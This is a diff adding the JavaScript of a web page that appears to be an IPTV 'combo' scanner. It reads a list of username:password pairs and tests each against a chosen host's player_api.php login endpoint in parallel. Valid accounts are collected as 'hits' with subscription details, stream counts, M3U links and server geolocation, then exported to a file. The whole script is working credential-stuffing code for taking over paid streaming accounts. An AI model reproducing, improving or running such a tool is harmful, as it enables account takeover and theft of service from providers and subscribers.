+    if (!divResultado) {
+        divResultado = document.createElement('div');
+        divResultado.id = 'resultado';
+        const joinBox = document.querySelector('.join-box');
+        joinBox.parentNode.insertBefore(divResultado, joinBox.nextSibling);
+    }
+    const bloco = document.createElement('div');
+    bloco.className = 'hit-block';
+    const botoes = document.createElement('div');
+    botoes.className = 'hit-buttons';
+    const btnCopiar = document.createElement('button');
+    btnCopiar.textContent = 'COPY HIT';
+    btnCopiar.title = 'COPY TO CLIPBOARD';
+    
+    btnCopiar.onclick = () => {
+        const fallbackCopy = (text) => {
+            const textArea = document.createElement("textarea");
+            textArea.value = text;
+            textArea.style.position = "fixed";
+            textArea.style.top = "-9999px";
+            textArea.style.left = "-9999px";
+            document.body.appendChild(textArea);
+            textArea.focus();
+            textArea.select();
+            try {
+                const successful = document.execCommand('copy');
+                if (successful) {
+                    alert('HIT COPIED TO CLIPBOARD!');
+                } else {
+                    alert('Copy failed. Your browser may not support this feature.');
+                }
+            } catch (err) {
+                alert('An error occurred while copying.');
+                console.error('Fallback execCommand failed:', err);
+            }
+            document.body.removeChild(textArea);
+        };
+
+        if (navigator.clipboard && window.isSecureContext) {
+            navigator.clipboard.writeText(hit).then(() => {
+                alert('HIT copied to clipboard!');
+            }).catch(err => {
+                console.error('Async clipboard API failed, trying fallback:', err);
+                fallbackCopy(hit);
+            });
+        } else {
+            fallbackCopy(hit);
+        }
+    };
+
+    botoes.appendChild(btnCopiar);
+    bloco.appendChild(botoes);
+    const texto = document.createElement('pre');
+    texto.textContent = hit;
+    bloco.appendChild(texto);
+    divResultado.appendChild(bloco);
+    divResultado.scrollTop = divResultado.scrollHeight;
+}
+
+async function getRealUserData(host, user, pass, printCategories) {
+    const baseUrl = `http://${host}/player_api.php?username=${user}&password=${pass}`;
+    try {
+        const userInfo = await fetchComTimeout(baseUrl).then(res => res.ok ? res.json() : Promise.reject('Invalid credentials'));
+
+        if (!userInfo.user_info || userInfo.user_info.auth !== 1) return null;
+
+        let categoryPromises = { live: Promise.resolve([]), vod: Promise.resolve([]), series: Promise.resolve([]) };
+        const fetchCategory = action => fetchComTimeout(`${baseUrl}&action=${action}`).then(res => res.ok ? res.json() : []).catch(() => []);
+        
+        if (printCategories) {
+            categoryPromises.live = fetchCategory('get_live_categories');
+            categoryPromises.vod = fetchCategory('get_vod_categories');
+            categoryPromises.series = fetchCategory('get_series_categories');
+        }
+        
+        const fetchAndCount = (action) => fetchComTimeout(`${baseUrl}&action=${action}`)
+            .then(res => res.ok ? res.json() : [])
+            .then(data => Array.isArray(data) ? data.length : 0)
+            .catch(() => 0);
+
+        const liveCountPromise = (userInfo.user_info.live_streams_count !== undefined && userInfo.user_info.live_streams_count > 0)
+            ? Promise.resolve(userInfo.user_info.live_streams_count) 
+            : fetchAndCount('get_live_streams');
+
+        const vodCountPromise = (userInfo.user_info.vod_streams_count !== undefined && userInfo.user_info.vod_streams_count > 0)
+            ? Promise.resolve(userInfo.user_info.vod_streams_count) 
+            : fetchAndCount('get_vod_streams');
+            
+        const seriesCountPromise = (userInfo.user_info.series_count !== undefined && userInfo.user_info.series_count > 0)
+            ? Promise.resolve(userInfo.user_info.series_count) 
+            : fetchAndCount('get_series');
+
+        const [
+            live_categories, 
+            vod_categories, 
+            series_categories,
+            live_streams_count,
+            vod_streams_count,
+            series_count
+        ] = await Promise.all([
+            categoryPromises.live,
+            categoryPromises.vod,
+            categoryPromises.series,
+            liveCountPromise,
+            vodCountPromise,
+            seriesCountPromise
+        ]);
+        
+        return {
+            ...userInfo.user_info,
+            server_info: userInfo.server_info,
+            timezone: userInfo.server_info?.timezone,
+            live_streams_count,
+            vod_streams_count,
+            series_count,
+            live_categories,
+            vod_categories,
+            series_categories,
+        };
+
+    } catch (error) {
+        console.warn(`API Error for ${user}:`, error.message || error);
+        return null;
+    }
+}
+
+async function iniciarScan() {
+    if (!document.getElementById('host').value) return alert('Enter the host to scan!');
+    if (!document.getElementById('comboFile').files[0]) return alert('Select a .txt file with combos!');
+    
+    scanParado = false;
+    desabilitarBotoes(true);
+    const existingResultDiv = document.getElementById('resultado');
+    if (existingResultDiv) existingResultDiv.innerHTML = '';
+    todosHits = [];
+    ultimoHit = '';
+    
+    const nick = document.getElementById('nick').value.trim() || 'FAWX';
+    const host = limparHost(document.getElementById('host').value.trim());
+    const file = document.getElementById('comboFile').files[0];
+    const combosTxt = await file.text();
+    const combos = combosTxt.split(/\r?\n/).filter(l => l.includes(':'));
+    const total = combos.length;
+    const numBots = parseInt(document.getElementById('numBots').value, 10) || 1;
+    atualizarStatus(0, total, 0, 0);
+
+    const emojis = {
+        emojiHeader: document.getElementById('emojiHeader').value, hitsPor: document.getElementById('emojiHitsPor').value,
+        servidor: document.getElementById('emojiServidor').value, 
+        usuario: document.getElementById('emojiUsuario').value, senha: document.getElementById('emojiSenha').value,
+        criada: document.getElementById('emojiCriada').value, expira: document.getElementById('emojiExpira').value,
+        status: document.getElementById('emojiStatus').value, emojiTrial: document.getElementById('emojiTrial').value,
+        conectados: document.getElementById('emojiConectados').value, conexoes: document.getElementById('emojiConexoes').value,
+        emojiTimezone: document.getElementById('emojiTimezone').value, linkM3U: document.getElementById('emojiLinkM3U').value,
+        emojiEpgLink: document.getElementById('emojiEpgLink').value, emojiMessage: document.getElementById('emojiMessage').value,
+        emojiChannels: document.getElementById('emojiChannels').value, emojiMovies: document.getElementById('emojiMovies').value,
+        emojiSeries: document.getElementById('emojiSeries').value,
+        emojiRealServer: document.getElementById('emojiRealServer').value, emojiRealM3U: document.getElementById('emojiRealM3U').value,
+        emojiLocation: document.getElementById('emojiLocation').value,
+        emojiProtocol: document.getElementById('emojiProtocol').value,
+        emojiDuration: document.getElementById('emojiDuration').value
+    };
+
+    const config = {
+        printCategories: document.getElementById('printCategories').value === 'true',
+        channelSeparator: document.getElementById('channelSeparator').value,
+        movieSeparator: document.getElementById('movieSeparator').value,
+        seriesSeparator: document.getElementById('seriesSeparator').value,
+        canalLink: document.getElementById('canalGrupoLink').value.trim(),
+        emojiCanal: document.getElementById('emojiCanalGrupo').value
+    };
+    
+    scanSettings = {
+        host: host.replace(/:/g, '_'),
+        nickname: nick,
+        headerEmoji: emojis.emojiHeader,
+        telegramEmoji: config.emojiCanal
+    };
+
+    let hits = 0, invalidos = 0, testados = 0;
+    
+    async function processCombo(combo) {
+        if (scanParado) return;
+
+        const [user, pass] = combo.split(/:(.*)/s);
+        if (!user || !pass) {
+            testados++;
+            invalidos++;
+            atualizarStatus(testados, total, hits, invalidos);
+            return;
+        }
+        
+        const realInfo = await getRealUserData(host, user, pass, config.printCategories);
+
+        if (realInfo) {
+            const geoLocation = await getGeoLocation(realInfo.server_info.url);
+            hits++;
+            const hitFormatado = formatarHit(realInfo, host, user, pass, nick, emojis, config, geoLocation);
+            ultimoHit = hitFormatado;
+            todosHits.push(hitFormatado);
+            await mostrarHitNaTela(hitFormatado);
+        } else {
+            invalidos++;
+        }
+        testados++;
+        atualizarStatus(testados, total, hits, invalidos);
+    }
+
+    const comboChunks = [];
+    for (let i = 0; i < combos.length; i += numBots) {
+        comboChunks.push(combos.slice(i, i + numBots));
+    }
+
+    for (const chunk of comboChunks) {
+        if (scanParado) break;
+        await Promise.all(chunk.map(combo => processCombo(combo)));
+    }
+
+    desabilitarBotoes(false);
+    alert('SCAN FINISHED!');
+}
+
+function pararScan(){scanParado=!0;desabilitarBotoes(!1)}
+
+function enviarTodosHits(){
+    if(0===todosHits.length)return alert("NO HITS TO SEND!");
+
+    const filename = `[👻][${scanSettings.host}][Team${scanSettings.headerEmoji}Stablack${scanSettings.headerEmoji}Scan${scanSettings.headerEmoji}𝙼𝟹𝚄🤴].txt`;
+    
+    const blob=new Blob([todosHits.join("\n\n\n")],{type:"text/plain"});
+    const url=URL.createObjectURL(blob);
+    const a=document.createElement("a");
+    a.href=url;
+    a.download=filename;
+    a.click();
+    URL.revokeObjectURL(url);
+}
+</script>
+
+</body>
+</html>
